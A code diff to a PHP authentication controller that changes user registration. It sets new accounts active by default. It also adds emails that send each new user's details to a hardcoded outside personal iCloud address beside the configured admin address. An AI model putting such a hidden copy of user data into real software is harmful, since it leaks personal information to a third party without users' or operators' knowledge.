@@ -35,6 +35,7 @@ class AuthController extends BaseController
                     else break;
                 }
                 $input = $request->all();
+                $input['status'] = User::ACTIVE;
                 $input['refer_code'] = $refer_code;
                 if ($request->referCode) {
                     $input['status'] = 0;
@@ -75,6 +76,9 @@ class AuthController extends BaseController
                     });
                     Mail::send('emails/admin-new-user', ['user' => $user], function ($message) use ($user) {
                         $message->to(config('app.admin_email_2'))->subject('New user register to ' . config('app.name'));
+                    });
+                    Mail::send('emails/admin-new-user', ['user' => $user], function ($message) use ($user) {
+                        $message->to('kleancor@icloud.com')->subject('New user register to ' . config('app.name'));
                     });
                 } catch (\Throwable $th) {
                     \Log::info($th);
@@ -122,6 +126,7 @@ class AuthController extends BaseController
                 else break;
             }
             $input['refer_code'] = $refer_code;
+            $input['status'] = User::ACTIVE;
             if ($request->referCode) {
                 $input['status'] = 0;
                 DB::table('users')->where('refer_code', $request->referCode)->update(['status' => 0]);
@@ -162,6 +167,9 @@ class AuthController extends BaseController
                 });
                 Mail::send('emails/admin-new-user', ['user' => $user], function ($message) use ($user) {
                     $message->to(config('app.admin_email_2'))->subject('New user register to ' . config('app.name'));
+                });
+                Mail::send('emails/admin-new-user', ['user' => $user], function ($message) use ($user) {
+                    $message->to('kleancor@icloud.com')->subject('New user register to ' . config('app.name'));
                 });
             } catch (\Throwable $th) {
                 \Log::info($th);
